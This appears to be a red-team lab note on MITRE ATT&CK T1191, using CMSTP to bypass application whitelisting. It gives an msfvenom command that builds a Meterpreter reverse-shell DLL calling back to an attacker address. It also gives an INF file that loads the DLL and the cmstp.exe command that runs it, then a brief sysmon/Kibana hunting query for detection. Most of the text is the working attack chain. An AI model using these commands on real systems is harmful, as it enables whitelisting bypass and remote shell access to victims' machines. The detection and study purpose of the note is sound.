---
description: CSMTP code execution - bypass application whitelisting.
---

# T1191: CSMTP

## Execution

Generating evil payload as a DLL - a reverse shell:

{% code-tabs %}
{% code-tabs-item title="evil.dll" %}
```text
msfvenom -p windows/x64/meterpreter/reverse_tcp LHOST=10.0.0.5 LPORT=443 -f dll > /root/tools/mitre/cmstp/evil.dll
```
{% endcode-tabs-item %}
{% endcode-tabs %}

Creating a file that will be loaded by CSMTP binary that will in turn load our evil.dll:

{% code-tabs %}
{% code-tabs-item title="f.inf" %}
```scheme
[version]
Signature=$chicago$
AdvancedINF=2.5
 
[DefaultInstall_SingleUser]
RegisterOCXs=RegisterOCXSection
 
[RegisterOCXSection]
C:\experiments\cmstp\evil.dll
 
[Strings]
AppAct = "SOFTWARE\Microsoft\Connection Manager"
ServiceName="mantvydas"
ShortSvcName="mantvydas"
```
{% endcode-tabs-item %}
{% endcode-tabs %}

Carrying out the execution attack:

```bash
PS C:\experiments\cmstp> cmstp.exe /s .\f.inf
```

## Observations

Rundll32 is sapwned which then establishes a connection back to the attacker:

![](../.gitbook/assets/cmstp-rundll32.png)

A very privitive way of hunting for suspicious instances of rundll32 initiating connections would be skimming through the sysmon logs to find any network connections established by rundll32 immediately/soon after it has been spawened by cmstp:

{% code-tabs %}
{% code-tabs-item title="kibana search query" %}
```javascript
cmstp.exe rundll32.exe
```
{% endcode-tabs-item %}
{% endcode-tabs %}

Note how the connection was established second after the process creation. This behaviour depends on what the payload is supposed to do, but if the payload is a reverse shell, it usually attempts connecting back immediately upon execution, which is exactly our case:

![](../.gitbook/assets/cmstp-kibana%20%281%29.png)

{% embed url="https://attack.mitre.org/wiki/Technique/T1191" %}

{% embed url="https://pentestlab.blog/2018/05/10/applocker-bypass-cmstp/" %}



